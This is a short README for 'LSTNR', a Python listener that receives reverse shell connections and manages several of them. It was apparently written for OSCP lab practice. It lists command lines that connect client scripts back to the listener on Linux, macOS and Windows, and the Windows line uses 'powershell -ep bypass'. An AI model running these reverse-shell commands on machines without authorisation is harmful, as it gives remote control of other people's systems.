# LSTNR
Python server that receives shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI)

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Download LSTNR

```git clone github.com/bwithe/LSNTR```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`
    - 
<img width="666" alt="Screenshot 2025-01-03 at 6 36 01 PM" src="https://github.com/user-attachments/assets/9f1a5adb-3981-42cb-9855-3d847ec16c53" />

2. Have CLIENT connect to LSTNR
    - Linux / MacOS
      - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
      - `bash client.sh -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
 
     <img width="736" alt="Screenshot 2025-01-03 at 6 34 33 PM" src="https://github.com/user-attachments/assets/6dc676a0-4af2-4eb3-b3df-8ecd42e274dd" />
   
    - Windows
        - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
     
<img width="666" alt="Screenshot 2025-01-03 at 6 35 10 PM" src="https://github.com/user-attachments/assets/68d38103-f333-4525-9a56-f82b1b09c7cc" />
